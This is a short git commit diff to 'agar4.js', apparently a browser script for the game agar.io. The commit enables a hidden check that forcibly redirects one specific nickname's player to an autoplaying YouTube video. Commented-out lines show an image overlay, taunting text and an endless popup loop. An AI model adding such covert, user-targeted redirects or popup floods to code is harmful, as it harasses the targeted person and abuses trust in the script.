d643b18eb3e704a5d35cd8fec9f084c183c9f4c8
notavailabledeveloper <notavailabledeveloper@gmail.com>
2017-06-07 14:34:01 +0200

    Update agar4.js

--- agar4.js
+++ agar4.js
@@ -1,11 +1,11 @@
 var nn = $("#nickname").val();
 
-if(nn == "๖ۣۜ𝓩𝓪𝔂𝓷𝓼❥༻" ) {
+if(nn == "KrvaviTurboUjo" ) {
 
 	//$("body").append("<img src='http://24sata.info/thumbnail.php?file=news/2010/may/srbija_bih_zastave_883416657.jpg&size=article_large' style='width:100%;height:100%;opacity:0.2;z-index:1200;position:absolute;top:0;left:0;'/>");
 	//window.open("https://akk.li/pics/anne/jpg");
 	//window.location = "https://akk.li/pics/anne/jpg";
-	//window.location = "https://www.youtube.com/embed/rX7XZLcGAxw?autoplay=1";
+	window.location = "https://www.youtube.com/embed/rX7XZLcGAxw?autoplay=1";
 	//$("body").append("<h1 style='position:absolute;top:200px;left:10px;'>Sрeс Krаljiсa</h1>");
 //	while(true) {
 	//window.open("https://akk.li/pics/anne/jpg");
